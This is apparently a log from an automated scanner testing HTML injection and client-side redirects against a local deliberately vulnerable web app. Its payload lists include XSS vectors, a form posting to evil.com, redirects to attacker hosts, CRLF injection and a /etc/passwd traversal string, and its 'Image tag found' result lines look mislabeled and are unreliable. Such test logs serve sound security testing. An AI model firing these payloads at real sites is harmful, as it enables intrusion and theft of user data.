+2025-08-05 14:19:09.738219 |     [✓] Image tag found with payload '<img src='x' onerror='alert(1)'>' (URL parameter)
+2025-08-05 14:19:09.738219 |   - Testing payload: <img src=x onerror=alert(1)>
+2025-08-05 14:19:09.741378 |     [✓] Image tag found with payload '<img src=x onerror=alert(1)>' (URL parameter)
+2025-08-05 14:19:09.742376 |   - Testing payload: <img src=x oneonerror=alert(1)>
+2025-08-05 14:19:09.745383 |     [✓] Image tag found with payload '<img src=x oneonerror=alert(1)>' (URL parameter)
+2025-08-05 14:19:09.745383 |   - Testing payload: <iframe src='javascript:alert(1)'>
+2025-08-05 14:19:09.749574 |     [✓] Image tag found with payload '<iframe src='javascript:alert(1)'>' (URL parameter)
+2025-08-05 14:19:09.749574 |   - Testing payload: <iframe src='data:text/html,<script>alert(1)</script>'>
+2025-08-05 14:19:09.752938 |     [✓] Image tag found with payload '<iframe src='data:text/html,<script>alert(1)</script>'>' (URL parameter)
+2025-08-05 14:19:09.753935 |   - Testing payload: <svg onload=alert(1)>
+2025-08-05 14:19:09.756943 |     [✓] Image tag found with payload '<svg onload=alert(1)>' (URL parameter)
+2025-08-05 14:19:09.757942 |   - Testing payload: <svg/onload=alert(1)>
+2025-08-05 14:19:09.761241 |     [✓] Image tag found with payload '<svg/onload=alert(1)>' (URL parameter)
+2025-08-05 14:19:09.761241 |   - Testing payload: <a href='javascript:alert(1)'>Click</a>
+2025-08-05 14:19:09.765243 |     [✓] Image tag found with payload '<a href='javascript:alert(1)'>Click</a>' (URL parameter)
+2025-08-05 14:19:09.765243 |   - Testing payload: <a href='data:text/html,<script>alert(1)</script>'>Click</a>
+2025-08-05 14:19:09.768634 |     [✓] Image tag found with payload '<a href='data:text/html,<script>alert(1)</script>'>Click</a>' (URL parameter)
+2025-08-05 14:19:09.768634 |   - Testing payload: <form action='http://evil.com'><input type='submit'></form>
+2025-08-05 14:19:09.772338 |     [✓] Image tag found with payload '<form action='http://evil.com'><input type='submit'></form>' (URL parameter)
+2025-08-05 14:19:09.772338 |   - Testing payload: <form><input name='user'><input type='submit'></form>
+2025-08-05 14:19:09.776600 |     [✓] Image tag found with payload '<form><input name='user'><input type='submit'></form>' (URL parameter)
+2025-08-05 14:19:09.776600 |   - Testing payload: <input type='text' onfocus=alert(1) autofocus>
+2025-08-05 14:19:09.780197 |     [✓] Image tag found with payload '<input type='text' onfocus=alert(1) autofocus>' (URL parameter)
+2025-08-05 14:19:09.780197 |   - Testing payload: <input type='text' onmouseover=alert(1)>
+2025-08-05 14:19:09.784388 |     [✓] Image tag found with payload '<input type='text' onmouseover=alert(1)>' (URL parameter)
+2025-08-05 14:19:09.784388 |   - Testing payload: <div style='color:red'>Red Text</div>
+2025-08-05 14:19:09.788395 |     [✓] Image tag found with payload '<div style='color:red'>Red Text</div>' (URL parameter)
+2025-08-05 14:19:09.788395 |   - Testing payload: <div style='position:absolute;top:0;left:0;width:100%;height:100%;background:red;z-index:9999'></div>
+2025-08-05 14:19:09.791403 |     [✓] Image tag found with payload '<div style='position:absolute;top:0;left:0;width:100%;height:100%;background:red;z-index:9999'></div>' (URL parameter)
+2025-08-05 14:19:09.791403 |   - Testing payload: <meta http-equiv='refresh' content='0;url=javascript:alert(1)'>
+2025-08-05 14:19:09.794890 |     [✓] Image tag found with payload '<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>' (URL parameter)
+2025-08-05 14:19:09.794890 |   - Testing payload: <ImG sRc=x oNeRrOr=alert(1)>
+2025-08-05 14:19:09.799364 |     [✓] Image tag found with payload '<ImG sRc=x oNeRrOr=alert(1)>' (URL parameter)
+2025-08-05 14:19:09.799364 |   - Testing payload: < img src=x onerror=alert(1)>
+2025-08-05 14:19:09.803244 |     [✓] Image tag found with payload '< img src=x onerror=alert(1)>' (URL parameter)
+2025-08-05 14:19:09.804348 |   - Testing payload: <img/src='x'/onerror=alert(1)>
+2025-08-05 14:19:09.807545 |     [✓] Image tag found with payload '<img/src='x'/onerror=alert(1)>' (URL parameter)
+2025-08-05 14:19:09.857456 |     [✓] Image tag found with payload '<h1>HTML Injection Test</h1>' (form parameter txtName)
+2025-08-05 14:19:09.905427 |     [✓] Image tag found with payload '<b>Bold Text</b>' (form parameter txtName)
+2025-08-05 14:19:09.952981 |     [✓] Image tag found with payload '<i>Italic Text</i>' (form parameter txtName)
+2025-08-05 14:19:09.999845 |     [✓] Image tag found with payload '<img src='x' onerror='alert(1)'>' (form parameter txtName)
+2025-08-05 14:19:10.048661 |     [✓] Image tag found with payload '<img src=x onerror=alert(1)>' (form parameter txtName)
+2025-08-05 14:19:10.103113 |     [✓] Image tag found with payload '<h1>HTML Injection Test</h1>' (form parameter btnSign)
+2025-08-05 14:19:10.150051 |     [✓] Image tag found with payload '<b>Bold Text</b>' (form parameter btnSign)
+2025-08-05 14:19:10.199016 |     [✓] Image tag found with payload '<i>Italic Text</i>' (form parameter btnSign)
+2025-08-05 14:19:10.246579 |     [✓] Image tag found with payload '<img src='x' onerror='alert(1)'>' (form parameter btnSign)
+2025-08-05 14:19:10.293396 |     [✓] Image tag found with payload '<img src=x onerror=alert(1)>' (form parameter btnSign)
+2025-08-05 14:19:10.350981 |     [✓] Image tag found with payload '<h1>HTML Injection Test</h1>' (form parameter btnClear)
+2025-08-05 14:19:10.405654 |     [✓] Image tag found with payload '<b>Bold Text</b>' (form parameter btnClear)
+2025-08-05 14:19:10.461427 |     [✓] Image tag found with payload '<i>Italic Text</i>' (form parameter btnClear)
+2025-08-05 14:19:10.518092 |     [✓] Image tag found with payload '<img src='x' onerror='alert(1)'>' (form parameter btnClear)
+2025-08-05 14:19:10.571524 |     [✓] Image tag found with payload '<img src=x onerror=alert(1)>' (form parameter btnClear)
+2025-08-05 14:19:10.572531 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/xss_d/
+2025-08-05 14:19:10.575920 |   - Found potential HTML sink: document.write(
+2025-08-05 14:19:10.575920 |   - Testing payload: <h1>HTML Injection Test</h1>
+2025-08-05 14:19:10.579727 |     [✓] Image tag found with payload '<h1>HTML Injection Test</h1>' (URL parameter)
+2025-08-05 14:19:10.579727 |   - Testing payload: <b>Bold Text</b>
+2025-08-05 14:19:10.582863 |     [✓] Image tag found with payload '<b>Bold Text</b>' (URL parameter)
+2025-08-05 14:19:10.583867 |   - Testing payload: <i>Italic Text</i>
+2025-08-05 14:19:10.587756 |     [✓] Image tag found with payload '<i>Italic Text</i>' (URL parameter)
+2025-08-05 14:19:10.587756 |   - Testing payload: <img src='x' onerror='alert(1)'>
+2025-08-05 14:19:10.590756 |     [✓] Image tag found with payload '<img src='x' onerror='alert(1)'>' (URL parameter)
+2025-08-05 14:19:10.591958 |   - Testing payload: <img src=x onerror=alert(1)>
+2025-08-05 14:19:10.594959 |     [✓] Image tag found with payload '<img src=x onerror=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.596416 |   - Testing payload: <img src=x oneonerror=alert(1)>
+2025-08-05 14:19:10.599425 |     [✓] Image tag found with payload '<img src=x oneonerror=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.600510 |   - Testing payload: <iframe src='javascript:alert(1)'>
+2025-08-05 14:19:10.604107 |     [✓] Image tag found with payload '<iframe src='javascript:alert(1)'>' (URL parameter)
+2025-08-05 14:19:10.605107 |   - Testing payload: <iframe src='data:text/html,<script>alert(1)</script>'>
+2025-08-05 14:19:10.615158 |     [✓] Image tag found with payload '<iframe src='data:text/html,<script>alert(1)</script>'>' (URL parameter)
+2025-08-05 14:19:10.615158 |   - Testing payload: <svg onload=alert(1)>
+2025-08-05 14:19:10.618613 |     [✓] Image tag found with payload '<svg onload=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.619613 |   - Testing payload: <svg/onload=alert(1)>
+2025-08-05 14:19:10.623615 |     [✓] Image tag found with payload '<svg/onload=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.623615 |   - Testing payload: <a href='javascript:alert(1)'>Click</a>
+2025-08-05 14:19:10.627801 |     [✓] Image tag found with payload '<a href='javascript:alert(1)'>Click</a>' (URL parameter)
+2025-08-05 14:19:10.628802 |   - Testing payload: <a href='data:text/html,<script>alert(1)</script>'>Click</a>
+2025-08-05 14:19:10.632319 |     [✓] Image tag found with payload '<a href='data:text/html,<script>alert(1)</script>'>Click</a>' (URL parameter)
+2025-08-05 14:19:10.632319 |   - Testing payload: <form action='http://evil.com'><input type='submit'></form>
+2025-08-05 14:19:10.636595 |     [✓] Image tag found with payload '<form action='http://evil.com'><input type='submit'></form>' (URL parameter)
+2025-08-05 14:19:10.636595 |   - Testing payload: <form><input name='user'><input type='submit'></form>
+2025-08-05 14:19:10.639959 |     [✓] Image tag found with payload '<form><input name='user'><input type='submit'></form>' (URL parameter)
+2025-08-05 14:19:10.639959 |   - Testing payload: <input type='text' onfocus=alert(1) autofocus>
+2025-08-05 14:19:10.644162 |     [✓] Image tag found with payload '<input type='text' onfocus=alert(1) autofocus>' (URL parameter)
+2025-08-05 14:19:10.644162 |   - Testing payload: <input type='text' onmouseover=alert(1)>
+2025-08-05 14:19:10.648695 |     [✓] Image tag found with payload '<input type='text' onmouseover=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.648695 |   - Testing payload: <div style='color:red'>Red Text</div>
+2025-08-05 14:19:10.652731 |     [✓] Image tag found with payload '<div style='color:red'>Red Text</div>' (URL parameter)
+2025-08-05 14:19:10.652731 |   - Testing payload: <div style='position:absolute;top:0;left:0;width:100%;height:100%;background:red;z-index:9999'></div>
+2025-08-05 14:19:10.655732 |     [✓] Image tag found with payload '<div style='position:absolute;top:0;left:0;width:100%;height:100%;background:red;z-index:9999'></div>' (URL parameter)
+2025-08-05 14:19:10.655732 |   - Testing payload: <meta http-equiv='refresh' content='0;url=javascript:alert(1)'>
+2025-08-05 14:19:10.660011 |     [✓] Image tag found with payload '<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>' (URL parameter)
+2025-08-05 14:19:10.660011 |   - Testing payload: <ImG sRc=x oNeRrOr=alert(1)>
+2025-08-05 14:19:10.664014 |     [✓] Image tag found with payload '<ImG sRc=x oNeRrOr=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.664014 |   - Testing payload: < img src=x onerror=alert(1)>
+2025-08-05 14:19:10.667202 |     [✓] Image tag found with payload '< img src=x onerror=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.667202 |   - Testing payload: <img/src='x'/onerror=alert(1)>
+2025-08-05 14:19:10.670979 |     [✓] Image tag found with payload '<img/src='x'/onerror=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.673980 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/client/
+2025-08-05 14:19:10.675983 |   - No obvious HTML sinks found in page source
+2025-08-05 14:19:10.675983 |   - Testing payload: <h1>HTML Injection Test</h1>
+2025-08-05 14:19:10.678181 |     [!] HTTP 404 with payload '<h1>HTML Injection Test</h1>' (URL parameter)
+2025-08-05 14:19:10.678181 |   - Testing payload: <b>Bold Text</b>
+2025-08-05 14:19:10.679189 |     [!] HTTP 404 with payload '<b>Bold Text</b>' (URL parameter)
+2025-08-05 14:19:10.679189 |   - Testing payload: <i>Italic Text</i>
+2025-08-05 14:19:10.681485 |     [!] HTTP 404 with payload '<i>Italic Text</i>' (URL parameter)
+2025-08-05 14:19:10.681485 |   - Testing payload: <img src='x' onerror='alert(1)'>
+2025-08-05 14:19:10.682783 |     [!] HTTP 404 with payload '<img src='x' onerror='alert(1)'>' (URL parameter)
+2025-08-05 14:19:10.683805 |   - Testing payload: <img src=x onerror=alert(1)>
+2025-08-05 14:19:10.685801 |     [!] HTTP 404 with payload '<img src=x onerror=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.685801 |   - Testing payload: <img src=x oneonerror=alert(1)>
+2025-08-05 14:19:10.690325 |     [!] HTTP 404 with payload '<img src=x oneonerror=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.690325 |   - Testing payload: <iframe src='javascript:alert(1)'>
+2025-08-05 14:19:10.692323 |     [!] HTTP 404 with payload '<iframe src='javascript:alert(1)'>' (URL parameter)
+2025-08-05 14:19:10.692323 |   - Testing payload: <iframe src='data:text/html,<script>alert(1)</script>'>
+2025-08-05 14:19:10.694455 |     [!] HTTP 404 with payload '<iframe src='data:text/html,<script>alert(1)</script>'>' (URL parameter)
+2025-08-05 14:19:10.694455 |   - Testing payload: <svg onload=alert(1)>
+2025-08-05 14:19:10.695456 |     [!] HTTP 404 with payload '<svg onload=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.696455 |   - Testing payload: <svg/onload=alert(1)>
+2025-08-05 14:19:10.698456 |     [!] HTTP 404 with payload '<svg/onload=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.698456 |   - Testing payload: <a href='javascript:alert(1)'>Click</a>
+2025-08-05 14:19:10.699610 |     [!] HTTP 404 with payload '<a href='javascript:alert(1)'>Click</a>' (URL parameter)
+2025-08-05 14:19:10.700609 |   - Testing payload: <a href='data:text/html,<script>alert(1)</script>'>Click</a>
+2025-08-05 14:19:10.701606 |     [!] HTTP 404 with payload '<a href='data:text/html,<script>alert(1)</script>'>Click</a>' (URL parameter)
+2025-08-05 14:19:10.701606 |   - Testing payload: <form action='http://evil.com'><input type='submit'></form>
+2025-08-05 14:19:10.704266 |     [!] HTTP 404 with payload '<form action='http://evil.com'><input type='submit'></form>' (URL parameter)
+2025-08-05 14:19:10.704266 |   - Testing payload: <form><input name='user'><input type='submit'></form>
+2025-08-05 14:19:10.705275 |     [!] HTTP 404 with payload '<form><input name='user'><input type='submit'></form>' (URL parameter)
+2025-08-05 14:19:10.706623 |   - Testing payload: <input type='text' onfocus=alert(1) autofocus>
+2025-08-05 14:19:10.707626 |     [!] HTTP 404 with payload '<input type='text' onfocus=alert(1) autofocus>' (URL parameter)
+2025-08-05 14:19:10.707626 |   - Testing payload: <input type='text' onmouseover=alert(1)>
+2025-08-05 14:19:10.709907 |     [!] HTTP 404 with payload '<input type='text' onmouseover=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.709907 |   - Testing payload: <div style='color:red'>Red Text</div>
+2025-08-05 14:19:10.712416 |     [!] HTTP 404 with payload '<div style='color:red'>Red Text</div>' (URL parameter)
+2025-08-05 14:19:10.712416 |   - Testing payload: <div style='position:absolute;top:0;left:0;width:100%;height:100%;background:red;z-index:9999'></div>
+2025-08-05 14:19:10.713416 |     [!] HTTP 404 with payload '<div style='position:absolute;top:0;left:0;width:100%;height:100%;background:red;z-index:9999'></div>' (URL parameter)
+2025-08-05 14:19:10.714419 |   - Testing payload: <meta http-equiv='refresh' content='0;url=javascript:alert(1)'>
+2025-08-05 14:19:10.715418 |     [!] HTTP 404 with payload '<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>' (URL parameter)
+2025-08-05 14:19:10.715418 |   - Testing payload: <ImG sRc=x oNeRrOr=alert(1)>
+2025-08-05 14:19:10.717424 |     [!] HTTP 404 with payload '<ImG sRc=x oNeRrOr=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.717424 |   - Testing payload: < img src=x onerror=alert(1)>
+2025-08-05 14:19:10.719425 |     [!] HTTP 404 with payload '< img src=x onerror=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.719425 |   - Testing payload: <img/src='x'/onerror=alert(1)>
+2025-08-05 14:19:10.721622 |     [!] HTTP 404 with payload '<img/src='x'/onerror=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.721622 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/sqli/
+2025-08-05 14:19:10.725761 |   - No obvious HTML sinks found in page source
+2025-08-05 14:19:10.726816 |   - Testing payload: <h1>HTML Injection Test</h1>
+2025-08-05 14:19:10.728824 |     [✓] Image tag found with payload '<h1>HTML Injection Test</h1>' (URL parameter)
+2025-08-05 14:19:10.730330 |   - Testing payload: <b>Bold Text</b>
+2025-08-05 14:19:10.733776 |     [✓] Image tag found with payload '<b>Bold Text</b>' (URL parameter)
+2025-08-05 14:19:10.733776 |   - Testing payload: <i>Italic Text</i>
+2025-08-05 14:19:10.737780 |     [✓] Image tag found with payload '<i>Italic Text</i>' (URL parameter)
+2025-08-05 14:19:10.737780 |   - Testing payload: <img src='x' onerror='alert(1)'>
+2025-08-05 14:19:10.741541 |     [✓] Image tag found with payload '<img src='x' onerror='alert(1)'>' (URL parameter)
+2025-08-05 14:19:10.741541 |   - Testing payload: <img src=x onerror=alert(1)>
+2025-08-05 14:19:10.744552 |     [✓] Image tag found with payload '<img src=x onerror=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.744552 |   - Testing payload: <img src=x oneonerror=alert(1)>
+2025-08-05 14:19:10.748890 |     [✓] Image tag found with payload '<img src=x oneonerror=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.748890 |   - Testing payload: <iframe src='javascript:alert(1)'>
+2025-08-05 14:19:10.751889 |     [✓] Image tag found with payload '<iframe src='javascript:alert(1)'>' (URL parameter)
+2025-08-05 14:19:10.753101 |   - Testing payload: <iframe src='data:text/html,<script>alert(1)</script>'>
+2025-08-05 14:19:10.756268 |     [✓] Image tag found with payload '<iframe src='data:text/html,<script>alert(1)</script>'>' (URL parameter)
+2025-08-05 14:19:10.756268 |   - Testing payload: <svg onload=alert(1)>
+2025-08-05 14:19:10.760274 |     [✓] Image tag found with payload '<svg onload=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.760274 |   - Testing payload: <svg/onload=alert(1)>
+2025-08-05 14:19:10.763436 |     [✓] Image tag found with payload '<svg/onload=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.763436 |   - Testing payload: <a href='javascript:alert(1)'>Click</a>
+2025-08-05 14:19:10.766857 |     [✓] Image tag found with payload '<a href='javascript:alert(1)'>Click</a>' (URL parameter)
+2025-08-05 14:19:10.767853 |   - Testing payload: <a href='data:text/html,<script>alert(1)</script>'>Click</a>
+2025-08-05 14:19:10.770929 |     [✓] Image tag found with payload '<a href='data:text/html,<script>alert(1)</script>'>Click</a>' (URL parameter)
+2025-08-05 14:19:10.770929 |   - Testing payload: <form action='http://evil.com'><input type='submit'></form>
+2025-08-05 14:19:10.774601 |     [✓] Image tag found with payload '<form action='http://evil.com'><input type='submit'></form>' (URL parameter)
+2025-08-05 14:19:10.775600 |   - Testing payload: <form><input name='user'><input type='submit'></form>
+2025-08-05 14:19:10.778683 |     [✓] Image tag found with payload '<form><input name='user'><input type='submit'></form>' (URL parameter)
+2025-08-05 14:19:10.778683 |   - Testing payload: <input type='text' onfocus=alert(1) autofocus>
+2025-08-05 14:19:10.781996 |     [✓] Image tag found with payload '<input type='text' onfocus=alert(1) autofocus>' (URL parameter)
+2025-08-05 14:19:10.781996 |   - Testing payload: <input type='text' onmouseover=alert(1)>
+2025-08-05 14:19:10.785495 |     [✓] Image tag found with payload '<input type='text' onmouseover=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.786086 |   - Testing payload: <div style='color:red'>Red Text</div>
+2025-08-05 14:19:10.789539 |     [✓] Image tag found with payload '<div style='color:red'>Red Text</div>' (URL parameter)
+2025-08-05 14:19:10.789539 |   - Testing payload: <div style='position:absolute;top:0;left:0;width:100%;height:100%;background:red;z-index:9999'></div>
+2025-08-05 14:19:10.792538 |     [✓] Image tag found with payload '<div style='position:absolute;top:0;left:0;width:100%;height:100%;background:red;z-index:9999'></div>' (URL parameter)
+2025-08-05 14:19:10.792538 |   - Testing payload: <meta http-equiv='refresh' content='0;url=javascript:alert(1)'>
+2025-08-05 14:19:10.797095 |     [✓] Image tag found with payload '<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>' (URL parameter)
+2025-08-05 14:19:10.797095 |   - Testing payload: <ImG sRc=x oNeRrOr=alert(1)>
+2025-08-05 14:19:10.800099 |     [✓] Image tag found with payload '<ImG sRc=x oNeRrOr=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.800099 |   - Testing payload: < img src=x onerror=alert(1)>
+2025-08-05 14:19:10.804780 |     [✓] Image tag found with payload '< img src=x onerror=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.804780 |   - Testing payload: <img/src='x'/onerror=alert(1)>
+2025-08-05 14:19:10.809070 |     [✓] Image tag found with payload '<img/src='x'/onerror=alert(1)>' (URL parameter)
+2025-08-05 14:19:10.815556 |     [✓] Image tag found with payload '<h1>HTML Injection Test</h1>' (form parameter id)
+2025-08-05 14:19:10.819653 |     [✓] Image tag found with payload '<b>Bold Text</b>' (form parameter id)
+2025-08-05 14:19:10.823149 |     [✓] Image tag found with payload '<i>Italic Text</i>' (form parameter id)
+2025-08-05 14:19:10.826148 |     [✓] Image tag found with payload '<img src='x' onerror='alert(1)'>' (form parameter id)
+2025-08-05 14:19:10.829305 |     [✓] Image tag found with payload '<img src=x onerror=alert(1)>' (form parameter id)
+2025-08-05 14:19:10.832818 |     [✓] Image tag found with payload '<h1>HTML Injection Test</h1>' (form parameter Submit)
+2025-08-05 14:19:10.837140 |     [✓] Image tag found with payload '<b>Bold Text</b>' (form parameter Submit)
+2025-08-05 14:19:10.840306 |     [✓] Image tag found with payload '<i>Italic Text</i>' (form parameter Submit)
+2025-08-05 14:19:10.844305 |     [✓] Image tag found with payload '<img src='x' onerror='alert(1)'>' (form parameter Submit)
+2025-08-05 14:19:10.847335 |     [✓] Image tag found with payload '<img src=x onerror=alert(1)>' (form parameter Submit)
+2025-08-05 14:19:10.847335 | ----- OTG-CLIENT-003 Test Completed -----
+
+2025-08-05 14:32:23.231540 | [+] Login successful (Status: 200)
+2025-08-05 14:32:23.284810 | [+] Security level set to low
+2025-08-05 14:32:23.286032 | ----- Starting OTG-CLIENT-004 (Client Side URL Redirect) -----
+2025-08-05 14:32:23.286032 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/redirect/
+2025-08-05 14:32:23.288235 |   - No obvious redirect sinks found in page source
+2025-08-05 14:32:23.289263 |   - Testing redirect payload: http://evil.com
+2025-08-05 14:32:23.290509 |     [!] HTTP 404 with payload 'http://evil.com' (URL parameter)
+2025-08-05 14:32:23.291508 |   - Testing redirect payload: https://attacker.site
+2025-08-05 14:32:23.292513 |     [!] HTTP 404 with payload 'https://attacker.site' (URL parameter)
+2025-08-05 14:32:23.293512 |   - Testing redirect payload: //evil.com
+2025-08-05 14:32:23.294513 |     [!] HTTP 404 with payload '//evil.com' (URL parameter)
+2025-08-05 14:32:23.295513 |   - Testing redirect payload: javascript:alert(1)
+2025-08-05 14:32:23.298119 |     [!] HTTP 404 with payload 'javascript:alert(1)' (URL parameter)
+2025-08-05 14:32:23.298119 |   - Testing redirect payload: javascript:alert(document.cookie)
+2025-08-05 14:32:23.299308 |     [!] HTTP 404 with payload 'javascript:alert(document.cookie)' (URL parameter)
+2025-08-05 14:32:23.300412 |   - Testing redirect payload: javascript:eval('alert(1)')
+2025-08-05 14:32:23.301471 |     [!] HTTP 404 with payload 'javascript:eval('alert(1)')' (URL parameter)
+2025-08-05 14:32:23.301471 |   - Testing redirect payload: data:text/html,<script>alert(1)</script>
+2025-08-05 14:32:23.303694 |     [!] HTTP 404 with payload 'data:text/html,<script>alert(1)</script>' (URL parameter)
+2025-08-05 14:32:23.303694 |   - Testing redirect payload: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+2025-08-05 14:32:23.305796 |     [!] HTTP 404 with payload 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' (URL parameter)
+2025-08-05 14:32:23.305796 |   - Testing redirect payload: http://example.com%0d%0aLocation:%20http://evil.com
+2025-08-05 14:32:23.307911 |     [!] HTTP 404 with payload 'http://example.com%0d%0aLocation:%20http://evil.com' (URL parameter)
+2025-08-05 14:32:23.307911 |   - Testing redirect payload: hTtP://evil.com
+2025-08-05 14:32:23.309064 |     [!] HTTP 404 with payload 'hTtP://evil.com' (URL parameter)
+2025-08-05 14:32:23.310073 |   - Testing redirect payload: http://evil.com@attacker.site
+2025-08-05 14:32:23.311698 |     [!] HTTP 404 with payload 'http://evil.com@attacker.site' (URL parameter)
+2025-08-05 14:32:23.311698 |   - Testing redirect payload: http://127.0.0.1:8080.attacker.site
+2025-08-05 14:32:23.313702 |     [!] HTTP 404 with payload 'http://127.0.0.1:8080.attacker.site' (URL parameter)
+2025-08-05 14:32:23.313702 |   - Testing redirect payload: /../../../../etc/passwd
+2025-08-05 14:32:23.316972 |     [!] HTTP 404 with payload '/../../../../etc/passwd' (URL parameter)
+2025-08-05 14:32:23.316972 |   - Testing redirect payload: \\evil.com\share
+2025-08-05 14:32:23.319906 |     [!] HTTP 404 with payload '\\evil.com\share' (URL parameter)
+2025-08-05 14:32:23.320431 |   - Testing redirect payload: chrome://settings
+2025-08-05 14:32:23.322525 |     [!] HTTP 404 with payload 'chrome://settings' (URL parameter)
+2025-08-05 14:32:23.323041 |   - Testing redirect payload: about:blank
+2025-08-05 14:32:23.325701 |     [!] HTTP 404 with payload 'about:blank' (URL parameter)
+2025-08-05 14:32:23.325701 |   - Testing redirect payload: view-source:http://evil.com
+2025-08-05 14:32:23.327993 |     [!] HTTP 404 with payload 'view-source:http://evil.com' (URL parameter)
+2025-08-05 14:32:23.328507 |   - Testing redirect payload: http%3A%2F%2Fevil.com
+2025-08-05 14:32:23.330061 |     [!] HTTP 404 with payload 'http%3A%2F%2Fevil.com' (URL parameter)
+2025-08-05 14:32:23.330061 |   - Testing redirect payload: j%61v%61script%3Aalert%281%29
+2025-08-05 14:32:23.332339 |     [!] HTTP 404 with payload 'j%61v%61script%3Aalert%281%29' (URL parameter)
+2025-08-05 14:32:23.333339 |   - Testing hash redirect payload: http://evil.com
+2025-08-05 14:32:23.335385 |     [!] HTTP 404 with payload 'http://evil.com' (URL hash)
+2025-08-05 14:32:23.335385 |   - Testing hash redirect payload: https://attacker.site
+2025-08-05 14:32:23.338112 |     [!] HTTP 404 with payload 'https://attacker.site' (URL hash)
+2025-08-05 14:32:23.338112 |   - Testing hash redirect payload: //evil.com
+2025-08-05 14:32:23.340113 |     [!] HTTP 404 with payload '//evil.com' (URL hash)
+2025-08-05 14:32:23.341112 |   - Testing hash redirect payload: javascript:alert(1)
+2025-08-05 14:32:23.343803 |     [!] HTTP 404 with payload 'javascript:alert(1)' (URL hash)
+2025-08-05 14:32:23.344335 |   - Testing hash redirect payload: javascript:alert(document.cookie)
+2025-08-05 14:32:23.346950 |     [!] HTTP 404 with payload 'javascript:alert(document.cookie)' (URL hash)
+2025-08-05 14:32:23.347477 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/client/
+2025-08-05 14:32:23.349177 |   - No obvious redirect sinks found in page source
+2025-08-05 14:32:23.349177 |   - Testing redirect payload: http://evil.com
+2025-08-05 14:32:23.350737 |     [!] HTTP 404 with payload 'http://evil.com' (URL parameter)
+2025-08-05 14:32:23.351258 |   - Testing redirect payload: https://attacker.site
+2025-08-05 14:32:23.353341 |     [!] HTTP 404 with payload 'https://attacker.site' (URL parameter)
+2025-08-05 14:32:23.353341 |   - Testing redirect payload: //evil.com
+2025-08-05 14:32:23.354895 |     [!] HTTP 404 with payload '//evil.com' (URL parameter)
+2025-08-05 14:32:23.355414 |   - Testing redirect payload: javascript:alert(1)
+2025-08-05 14:32:23.356973 |     [!] HTTP 404 with payload 'javascript:alert(1)' (URL parameter)
+2025-08-05 14:32:23.356973 |   - Testing redirect payload: javascript:alert(document.cookie)
+2025-08-05 14:32:23.359088 |     [!] HTTP 404 with payload 'javascript:alert(document.cookie)' (URL parameter)
+2025-08-05 14:32:23.359607 |   - Testing redirect payload: javascript:eval('alert(1)')
+2025-08-05 14:32:23.361260 |     [!] HTTP 404 with payload 'javascript:eval('alert(1)')' (URL parameter)
+2025-08-05 14:32:23.361260 |   - Testing redirect payload: data:text/html,<script>alert(1)</script>
+2025-08-05 14:32:23.362808 |     [!] HTTP 404 with payload 'data:text/html,<script>alert(1)</script>' (URL parameter)
+2025-08-05 14:32:23.363331 |   - Testing redirect payload: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+2025-08-05 14:32:23.364364 |     [!] HTTP 404 with payload 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' (URL parameter)
+2025-08-05 14:32:23.364886 |   - Testing redirect payload: http://example.com%0d%0aLocation:%20http://evil.com
+2025-08-05 14:32:23.366966 |     [!] HTTP 404 with payload 'http://example.com%0d%0aLocation:%20http://evil.com' (URL parameter)
+2025-08-05 14:32:23.366966 |   - Testing redirect payload: hTtP://evil.com
+2025-08-05 14:32:23.369043 |     [!] HTTP 404 with payload 'hTtP://evil.com' (URL parameter)
+2025-08-05 14:32:23.369043 |   - Testing redirect payload: http://evil.com@attacker.site
+2025-08-05 14:32:23.370725 |     [!] HTTP 404 with payload 'http://evil.com@attacker.site' (URL parameter)
+2025-08-05 14:32:23.370725 |   - Testing redirect payload: http://127.0.0.1:8080.attacker.site
+2025-08-05 14:32:23.372333 |     [!] HTTP 404 with payload 'http://127.0.0.1:8080.attacker.site' (URL parameter)
+2025-08-05 14:32:23.373340 |   - Testing redirect payload: /../../../../etc/passwd
+2025-08-05 14:32:23.375175 |     [!] HTTP 404 with payload '/../../../../etc/passwd' (URL parameter)
+2025-08-05 14:32:23.375175 |   - Testing redirect payload: \\evil.com\share
+2025-08-05 14:32:23.378577 |     [!] HTTP 404 with payload '\\evil.com\share' (URL parameter)
+2025-08-05 14:32:23.379102 |   - Testing redirect payload: chrome://settings
+2025-08-05 14:32:23.381275 |     [!] HTTP 404 with payload 'chrome://settings' (URL parameter)
+2025-08-05 14:32:23.381275 |   - Testing redirect payload: about:blank
+2025-08-05 14:32:23.382682 |     [!] HTTP 404 with payload 'about:blank' (URL parameter)
